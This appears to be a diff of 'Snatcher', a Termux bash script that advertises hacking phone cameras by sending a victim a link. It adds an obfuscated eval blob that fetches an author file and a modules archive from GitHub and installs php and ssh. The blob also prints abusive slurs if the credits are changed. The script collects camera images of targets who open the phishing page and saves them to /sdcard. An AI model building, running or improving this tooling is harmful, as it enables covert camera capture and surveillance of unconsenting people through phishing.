@@ -1,6 +1,12 @@
-#!/usr/bin/env bash
+#!/data/data/com.termux/files/usr/bin/bash
 
-cwd=`pwd`
+##   Snatcher : 	hack phone camera by sending a link 📸
+##   Author 	: 	https://t.me/nullxvoid 
+##   Version 	: 	1.0.0
+
+AUTHOR=$(cat lib/AUTHOR)
+VERSION=$(cat lib/VERSION)
+
 
 # Net check 
 
@@ -11,9 +17,16 @@ if [ "$?" != '0' ]; then
 fi 
 
 # Requirements 
+if [[ ! -d "${HOME}storage" ]]; then
+  termux-setup-storage
+  mv -f Snatcher-imgs /sdcard > /dev/null 2>&1 
+else
+  mv -f Snatcher-imgs /sdcard > /dev/null 2>&1
+fi
 z="
-";TBz='equi';Oz='ienk';UCz='rf m';ZBz='ome ';OBz='es" ';Bz='or=$';Zz='HOR=';Uz='if [';bBz='"';Sz='d -n';mz=' se ';hz='"\e[';az='Alie';Iz='.sh ';VBz='nts.';Nz='R=Al';QBz='tall';qz='mada';Mz='UTHO';nz='code';NCz='.tar';Cz='(cat';gz=' -e ';cBz='apt ';HCz='ar.g';qBz='ps:/';Lz='w "A';Dz=' ~/S';rz='rcho';Yz=' AUT';PCz='> /d';dz=']]; ';fz='echo';LCz=' mod';HBz='exit';sz='d\nD';jz='abhi';WBz='. ma';mBz='>&1';Rz=' hea';cz='shn ';xz=' cre';UBz='reme';BBz=' son';GCz='es.t';GBz='p 3';BCz='es/d';Az='auth';ICz='z';IBz='else';Fz='her/';Xz='r !=';TCz='rm -';bz='nkri';CCz='ownl';SBz='ll r';SCz='2>&1';Tz='1)';sBz='hub.';oz=' kar';iz='31mK';JCz='tar ';NBz='odul';ABz=' you';pBz=' htt';vBz='4You';YBz='ke s';CBz=' of ';Wz='utho';gBz='open';nBz='curl';kz=' to ';Gz='snat';DBz='a bi';RCz='ull ';wz=' the';tBz='com/';MCz='ules';oBz=' -LO';eBz='all ';KCz='-zxf';jBz=' /de';fBz='php ';DCz='oad/';pz=' le ';Qz='n" |';uBz='Anon';aBz='time';ECz='v1.0';lBz='ll 2';FBz='slee';Kz='ep -';tz='o no';MBz=' ".M';OCz='.gz ';PBz='"Ins';Pz='rish';Ez='natc';FCz='.0/m';hBz='ssh ';yz='dits';LBz='[ -d';iBz='-y >';wBz='/Sna';EBz='tch"';RBz='ig a';vz='nage';ez='then';lz='khud';Vz='[ $a';JBz=' ""';rBz='/git';QCz='ev/n';Hz='cher';uz='t ch';dBz='inst';yBz='r/re';Jz='| gr';XBz='y ta';ACz='leas';xBz='tche';KBz='fi';kBz='v/nu';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$z$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$z$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$z$FBz$GBz$z$HBz$z$IBz$z$fz$JBz$z$KBz$z$Uz$LBz$MBz$NBz$OBz$dz$ez$z$fz$JBz$z$IBz$z$fz$gz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$aBz$bBz$z$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$z$cBz$dBz$eBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$z$nBz$oBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$BCz$CCz$DCz$ECz$FCz$NBz$GCz$HCz$ICz$z$JCz$KCz$LCz$MCz$NCz$OCz$PCz$QCz$RCz$SCz$z$TCz$UCz$NBz$GCz$HCz$ICz$z$KBz"
+";nz='khud';Iz='ithu';NBz='[ -d';GBz='tch"';rz=' le ';Mz='.com';JBz='exit';xBz='com/';HCz='oad/';ABz=' cre';Sz='efs/';fz='; th';tBz=' htt';Az='crea';yBz='Anon';CBz=' you';YCz='rf m';mBz='-y >';OBz=' ".M';cBz='ke s';BBz='dits';WCz='2>&1';FCz='es/d';aBz='. ma';Bz='tor=';jz='"\e[';Xz='UTHO';Jz='buse';gBz='apt ';yz=' the';Lz='tent';SCz='.gz ';sz='mada';iBz='all ';wBz='hub.';DCz='r/re';OCz='-zxf';MBz='fi';MCz='z';DBz=' son';PCz=' mod';QCz='ules';CCz='tche';qBz='>&1';dz='= $A';qz=' kar';sBz=' -LO';vz='o no';ECz='leas';gz='en';UBz='tall';kBz='open';Gz='://r';Yz='R)';pBz='ll 2';dBz='ome ';uz='d\nD';Hz='aw.g';oBz='v/nu';mz=' to ';lz='abhi';VBz='ig a';Rz='er/r';QBz='es" ';XBz='equi';Cz='$(cu';cz='or !';YBz='reme';bz='reat';KCz='es.t';XCz='rm -';ZBz='nts.';uBz='ps:/';GCz='ownl';Wz='ib/A';JCz='.0/m';pz='code';Vz='in/l';Oz='n4Yo';Zz='if [';HBz='slee';ACz='4You';RCz='.tar';TCz='> /d';PBz='odul';KBz='else';VCz='ull ';tz='rcho';oz=' se ';Nz='/Ano';hBz='inst';LCz='ar.g';lBz='ssh ';ICz='v1.0';wz='t ch';Fz='ttps';Pz='u/Sn';UCz='ev/n';Qz='atch';jBz='php ';nBz=' /de';LBz=' ""';iz=' -e ';EBz=' of ';Uz='s/ma';rBz='curl';WBz='ll r';fBz='"';az='[ $c';SBz='then';kz='31mK';TBz='"Ins';RBz=']]; ';eBz='time';NCz='tar ';vBz='/git';Ez='sL h';Tz='head';BCz='/Sna';bBz='y ta';IBz='p 3';ez='R ]]';hz='echo';Dz='rl -';Kz='rcon';xz='nage';FBz='a bi';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$z$Zz$az$bz$cz$dz$Xz$ez$fz$gz$z$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$z$HBz$IBz$z$JBz$z$KBz$z$hz$LBz$z$MBz$z$Zz$NBz$OBz$PBz$QBz$RBz$SBz$z$hz$LBz$z$KBz$z$hz$iz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$eBz$fBz$z$gBz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$z$gBz$hBz$iBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$z$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$BCz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$PBz$KCz$LCz$MCz$z$NCz$OCz$PCz$QCz$RCz$SCz$TCz$UCz$VCz$WCz$z$XCz$YCz$PBz$KCz$LCz$MCz$z$MBz"
+
 main(){
   clear
   printf "
@@ -23,7 +36,7 @@ main(){
    >=>      >=>  >=>  >=>   >=>    >=>    >=>    >=>>=>   >>   >=>   >=>    
       >=>   >=>  >=> >=>    >=>    >=>   >=>     >=>  >=> >>===>>=>  >=>    
 >=>    >=>  >=>  >=>  >=>   >=>    >=>    >=>    >>   >=> >>         >=>    
-  >=>>=>   >==>  >=>   >==>>>==>    >=>     >==> >=>  >=>  >====>   >==>" | lolcat
+  >=>>=>   >==>  >=>   >==>>>==>    >=>     >==> >=>  >=>  >====>   >==> Ver-${VERSION}" | lolcat
 printf "
 
   \e[31;1m         .:.:.\e[0m\e[1;32m Snatcher camera hacker by ${AUTHOR} \e[0m\e[1;91m.:.:.\e[0m\n
@@ -123,8 +136,8 @@ echo -e "\n\e[31;1mWaiting for target info, press CTRL+C to stop\e[0m\n"
     if [[ -e ".site/$website/log.txt" ]]; then
       rm -rf .site/$website/log.txt
       echo -e "\n\e[32;1mImages snathed successfully..\e[0m"
-      mv -v .site/$website/*.png Snatched > /dev/null 2>&1
-      echo -e "images saved in ${cwd}/Snathched directory\n"
+      mv -f .site/$website/*.png /sdcard/Snatcher-imgs > /dev/null 2>&1
+      echo -e "images saved in /sdcard/Snatcher-imgs directory\n"
       echo -e "\n\e[31;1mWaiting for next target info press CTRL+C to exit\e[0m\n"
     fi 
     sleep 0.75
@@ -138,7 +151,7 @@ usr_intrp(){
   sleep 2
   exit
 }
-AUTHOR=Alienkrishn
+
 trap usr_intrp SIGINT
 trap usr_intrp SIGTSTP
 main
